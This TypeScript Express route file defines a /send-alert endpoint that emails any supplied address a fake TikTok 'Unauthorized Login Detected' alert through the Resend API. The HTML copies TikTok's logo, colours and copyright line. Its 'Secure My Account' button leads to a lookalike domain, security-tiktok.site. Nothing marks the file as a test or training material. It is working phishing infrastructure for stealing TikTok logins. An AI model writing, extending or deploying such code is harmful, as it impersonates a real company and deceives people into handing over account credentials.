import { Router, type IRouter } from "express";
import { Resend } from "resend";
import { SendAlertBody, SendAlertResponse } from "@workspace/api-zod";

const router: IRouter = Router();

const resend = new Resend(process.env.RESEND_KEY);

router.post("/send-alert", async (req, res) => {
  const parsed = SendAlertBody.safeParse(req.body);
  if (!parsed.success) {
    res.status(400).json({ success: false, message: "Invalid request body" });
    return;
  }

  const { email } = parsed.data;

  const { error } = await resend.emails.send({
    from: process.env.RESEND_FROM ?? "TikTok Security <onboarding@resend.dev>",
    to: [email],
    subject: "Unauthorized Login Detected on Your TikTok Account",
    html: `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>TikTok Security Alert</title>
</head>
<body style="margin:0;padding:0;background-color:#f4f4f5;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;">
  <table width="100%" cellpadding="0" cellspacing="0" style="background-color:#f4f4f5;padding:40px 0;">
    <tr>
      <td align="center">
        <table width="600" cellpadding="0" cellspacing="0" style="max-width:600px;width:100%;background-color:#ffffff;border-radius:8px;overflow:hidden;border:1px solid #e4e4e7;">

          <!-- Header -->
          <tr>
            <td style="background-color:#ffffff;padding:28px 40px;text-align:center;">
              <img src="https://upload.wikimedia.org/wikipedia/en/thumb/a/a9/TikTok_logo.svg/1280px-TikTok_logo.svg.png"
                alt="TikTok"
                width="130"
                style="display:block;margin:0 auto;height:auto;" />
            </td>
          </tr>

          <!-- Alert banner -->
          <tr>
            <td style="background-color:#fe2c55;padding:14px 40px;text-align:center;">
              <p style="margin:0;color:#ffffff;font-size:13px;font-weight:700;letter-spacing:1.5px;text-transform:uppercase;">Security Alert</p>
            </td>
          </tr>

          <!-- Main content -->
          <tr>
            <td style="padding:44px 40px 32px;text-align:center;">
              <table width="100%" cellpadding="0" cellspacing="0">
                <tr>
                  <td align="center" style="padding-bottom:24px;">
                    <div style="width:64px;height:64px;background-color:#fff1f4;border-radius:50%;margin:0 auto;text-align:center;line-height:64px;">
                      <span style="font-size:28px;line-height:64px;display:inline-block;vertical-align:middle;color:#fe2c55;font-weight:700;">!</span>
                    </div>
                  </td>
                </tr>
                <tr>
                  <td>
                    <h1 style="margin:0 0 16px;color:#09090b;font-size:22px;font-weight:700;line-height:1.3;text-align:center;">
                      Unauthorized Login Detected
                    </h1>
                    <p style="margin:0 auto;color:#71717a;font-size:15px;line-height:1.7;max-width:440px;text-align:center;">
                      Someone has accessed your TikTok account from an unrecognized device. We recommend securing your account immediately to prevent further unauthorized access.
                    </p>
                  </td>
                </tr>
              </table>
            </td>
          </tr>

          <!-- Details card -->
          <tr>
            <td style="padding:0 40px 32px;">
              <table width="100%" cellpadding="0" cellspacing="0" style="background-color:#fafafa;border-radius:8px;border:1px solid #e4e4e7;overflow:hidden;">
                <tr>
                  <td style="padding:16px 24px;border-bottom:1px solid #e4e4e7;">
                    <p style="margin:0;color:#71717a;font-size:11px;font-weight:700;letter-spacing:1px;text-transform:uppercase;">Login Details</p>
                  </td>
                </tr>
                <tr>
                  <td style="padding:14px 24px;border-bottom:1px solid #e4e4e7;">
                    <table width="100%" cellpadding="0" cellspacing="0">
                      <tr>
                        <td style="color:#71717a;font-size:13px;width:130px;">Location</td>
                        <td style="color:#09090b;font-size:13px;font-weight:600;">Unknown Location</td>
                      </tr>
                    </table>
                  </td>
                </tr>
                <tr>
                  <td style="padding:14px 24px;border-bottom:1px solid #e4e4e7;">
                    <table width="100%" cellpadding="0" cellspacing="0">
                      <tr>
                        <td style="color:#71717a;font-size:13px;width:130px;">Device</td>
                        <td style="color:#09090b;font-size:13px;font-weight:600;">Unrecognized Device</td>
                      </tr>
                    </table>
                  </td>
                </tr>
                <tr>
                  <td style="padding:14px 24px;">
                    <table width="100%" cellpadding="0" cellspacing="0">
                      <tr>
                        <td style="color:#71717a;font-size:13px;width:130px;">Date &amp; Time</td>
                        <td style="color:#09090b;font-size:13px;font-weight:600;">${new Date().toUTCString()}</td>
                      </tr>
                    </table>
                  </td>
                </tr>
              </table>
            </td>
          </tr>

          <!-- CTA -->
          <tr>
            <td style="padding:0 40px 40px;text-align:center;">
              <p style="color:#71717a;font-size:14px;margin:0 0 24px;line-height:1.6;">
                If this was not you, please secure your account immediately by updating your password.
              </p>
              <a href="https://www.security-tiktok.site"
                style="display:inline-block;background-color:#fe2c55;color:#ffffff;text-decoration:none;padding:14px 36px;border-radius:6px;font-size:15px;font-weight:700;">
                Secure My Account
              </a>
              <p style="color:#a1a1aa;font-size:12px;margin:20px 0 0;">
                If the button does not work, copy and paste this link into your browser:<br/>
                <a href="https://www.security-tiktok.site" style="color:#fe2c55;text-decoration:none;">https://www.security-tiktok.site</a>
              </p>
            </td>
          </tr>

          <!-- Divider -->
          <tr>
            <td style="padding:0 40px;">
              <div style="border-top:1px solid #e4e4e7;"></div>
            </td>
          </tr>

          <!-- Footer -->
          <tr>
            <td style="padding:24px 40px;text-align:center;">
              <p style="margin:0 0 6px;color:#a1a1aa;font-size:12px;line-height:1.6;">
                This is an automated security notification from TikTok.<br/>
                Please do not reply to this email.
              </p>
              <p style="margin:0;color:#d4d4d8;font-size:11px;">
                &copy; ${new Date().getFullYear()} TikTok Pte. Ltd. All rights reserved.
              </p>
            </td>
          </tr>

        </table>
      </td>
    </tr>
  </table>
</body>
</html>`,
  });

  if (error) {
    console.error("Resend error:", error);
    res.status(500).json({ success: false, message: "Failed to send email." });
    return;
  }

  const response = SendAlertResponse.parse({ success: true, message: "Alert email sent successfully." });
  res.json(response);
});

export default router;
